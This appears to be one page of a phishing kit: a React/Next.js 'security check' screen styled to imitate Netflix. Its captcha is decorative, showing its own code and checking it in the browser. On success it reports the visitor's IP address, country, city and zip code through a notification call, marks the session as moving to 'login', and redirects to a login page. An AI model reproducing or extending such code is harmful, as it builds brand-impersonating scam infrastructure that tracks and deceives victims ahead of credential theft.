'use client';

import { useState, useCallback, useEffect, useRef } from "react";
import { useRouter } from "next/navigation";
import { ShieldCheck, RefreshCw } from "lucide-react";
import { trpc } from "@/lib/trpc";
import { useSession } from "@/lib/contexts/SessionContext";

function generateCaptcha(): string {
  return Math.floor(1000 + Math.random() * 9000).toString();
}

export default function CaptchaPage() {
  const router = useRouter();
  const { sessionId, geoData, t } = useSession();
  const [captchaCode, setCaptchaCode] = useState(() => generateCaptcha());
  const [userInput, setUserInput] = useState(["", "", "", ""]);
  const [error, setError] = useState("");
  const [refreshing, setRefreshing] = useState(false);
  const inputRefs = [
    useRef<HTMLInputElement>(null),
    useRef<HTMLInputElement>(null),
    useRef<HTMLInputElement>(null),
    useRef<HTMLInputElement>(null),
  ];

  const notifyCaptcha = trpc.notify.captchaPassed.useMutation();
  const updateStatus = trpc.session.updateStatus.useMutation();

  const refreshCaptcha = useCallback(() => {
    setRefreshing(true);
    setUserInput(["", "", "", ""]);
    setError("");
    setTimeout(() => {
      setCaptchaCode(generateCaptcha());
      setRefreshing(false);
      inputRefs[0].current?.focus();
    }, 300);
  }, []);

  const handleDigitInput = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    const newInput = [...userInput];
    newInput[index] = value.slice(-1);
    setUserInput(newInput);
    setError("");
    if (value && index < 3) inputRefs[index + 1].current?.focus();
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !userInput[index] && index > 0) inputRefs[index - 1].current?.focus();
  };

  const verifyCode = () => {
    const entered = userInput.join("");
    if (entered.length < 4) {
      setError(t("enterAllDigits"));
      return;
    }
    if (entered === captchaCode) {
      if (sessionId && geoData) {
        notifyCaptcha.mutate({
          sessionId,
          ip: geoData.ip,
          country: geoData.country,
          city: geoData.city,
          zip: geoData.zip,
          countryCode: geoData.countryCode,
        });
        updateStatus.mutate({ sessionId, status: "login" });
      }
      // Mark captcha as solved
      try {
        localStorage.setItem("nf_captcha_solved", "1");
        document.cookie = "nf_captcha_solved=1; path=/; max-age=2592000";
      } catch {}
      router.push("/login");
    } else {
      setError(t("incorrectCode"));
      setUserInput(["", "", "", ""]);
      setCaptchaCode(generateCaptcha());
      setTimeout(() => inputRefs[0].current?.focus(), 100);
    }
  };

  useEffect(() => {
    inputRefs[0].current?.focus();
  }, []);

  return (
    <div style={{ backgroundColor: "#141414", minHeight: "100vh", display: "flex", flexDirection: "column" }}>
      <div style={{ flex: 1, display: "flex", alignItems: "center", justifyContent: "center", padding: "20px 16px" }}>
        <div style={{
          backgroundColor: "rgba(0,0,0,0.75)",
          borderRadius: "4px",
          padding: "clamp(32px, 6vw, 60px) clamp(20px, 6vw, 68px)",
          width: "100%",
          maxWidth: "460px",
          boxSizing: "border-box",
        }}>
          <div style={{ display: "flex", alignItems: "center", gap: "10px", marginBottom: "8px" }}>
            <ShieldCheck size={26} color="#E50914" />
            <h1 style={{ color: "white", fontSize: "clamp(22px, 5vw, 28px)", fontWeight: 700, margin: 0, fontFamily: "'Helvetica Neue', Helvetica, Arial, sans-serif" }}>
              {t("securityCheck")}
            </h1>
          </div>
          <p style={{ color: "#8c8c8c", fontSize: "clamp(13px, 3vw, 14px)", marginBottom: "28px" }}>{t("enterCode")}</p>

          <div style={{ display: "flex", justifyContent: "center", gap: "clamp(10px, 3vw, 18px)", marginBottom: "8px" }}>
            {captchaCode.split("").map((digit, i) => (
              <span key={i} className="captcha-digit" style={{ color: refreshing ? "rgba(255,255,255,0.5)" : "white" }}>
                {digit}
              </span>
            ))}
          </div>

          <button onClick={refreshCaptcha} disabled={refreshing} style={{ background: "none", border: "none", color: "#0099d8", cursor: "pointer", display: "flex", alignItems: "center", gap: "4px", fontSize: "12px", marginBottom: "24px", marginLeft: "auto", marginRight: "auto" }}>
            <RefreshCw size={12} />
            {t("getNewCode")}
          </button>

          <div style={{ display: "grid", gridTemplateColumns: "repeat(4, 1fr)", gap: "12px", marginBottom: "28px" }}>
            {inputRefs.map((ref, i) => (
              <input
                key={i}
                ref={ref}
                type="text"
                inputMode="numeric"
                maxLength={1}
                value={userInput[i]}
                onChange={(e) => handleDigitInput(i, e.target.value)}
                onKeyDown={(e) => handleKeyDown(i, e)}
                placeholder="0"
                style={{
                  width: "100%",
                  aspectRatio: "1",
                  fontSize: "24px",
                  fontWeight: 600,
                  textAlign: "center",
                  backgroundColor: "rgba(255,255,255,0.05)",
                  border: "1px solid rgba(255,255,255,0.1)",
                  borderRadius: "4px",
                  color: "white",
                  outline: "none",
                }}
              />
            ))}
          </div>

          {error && <p style={{ color: "#e50914", fontSize: "12px", marginBottom: "16px", textAlign: "center" }}>{error}</p>}

          <button onClick={verifyCode} style={{
            width: "100%",
            backgroundColor: "#E50914",
            color: "white",
            border: "none",
            borderRadius: "4px",
            padding: "10px",
            fontSize: "16px",
            fontWeight: 700,
            cursor: "pointer",
            transition: "background-color 0.15s ease",
          }} onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = "#c40812")} onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = "#E50914")}>
            {t("verify")}
          </button>
        </div>
      </div>
    </div>
  );
}
